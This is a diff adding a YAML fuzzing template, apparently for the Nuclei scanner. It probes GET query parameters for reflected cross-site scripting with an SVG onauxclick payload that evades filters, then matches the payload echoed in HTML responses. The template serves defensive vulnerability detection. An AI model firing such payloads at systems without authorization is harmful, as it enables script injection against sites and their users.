@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-svg-auxclick
+
+info:
+  name: Reflection XSS Detection with SVG onauxclick
+  author: netbaan
+  severity: low
+  description: |
+    This template tests for potential reflection XSS vulnerabilities using a specific SVG payload that utilizes the 'onauxclick' event.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "/<svg%0Aonauxclick=0;\[1\].some(confirm)//"  # URL encoded payload with escaped brackets
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"  # Check if payload appears in the response body
+
+      - type: word
+        part: header
+        words:
+          - "text/html"  # Check if the response is HTML content
